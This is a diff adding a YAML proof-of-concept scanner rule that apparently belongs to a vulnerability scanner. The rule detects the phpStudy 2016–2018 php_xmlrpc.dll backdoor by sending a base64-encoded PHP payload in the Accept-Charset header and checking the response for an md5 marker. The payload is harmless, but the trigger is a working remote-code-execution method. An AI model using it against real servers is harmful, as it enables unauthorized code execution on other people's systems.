@@ -1,0 +1,19 @@
+name: poc-yaml-phpstudy-backdoor-rce
+set:
+  r: randomLowercase(6)
+  payload: base64("printf(md5('" + r + "'));")
+rules:
+  - method: GET
+    path: /index.php
+    headers:
+      Accept-Encoding: 'gzip,deflate'
+      Accept-Charset: '{{payload}}'
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(bytes(md5(r)))
+detail:
+  author: 17bdw
+  Affected Version: "phpstudy 2016-phpstudy 2018 php 5.2 php 5.4"
+  vuln_url: "php_xmlrpc.dll"
+  links:
+    - https://www.freebuf.com/column/214946.html
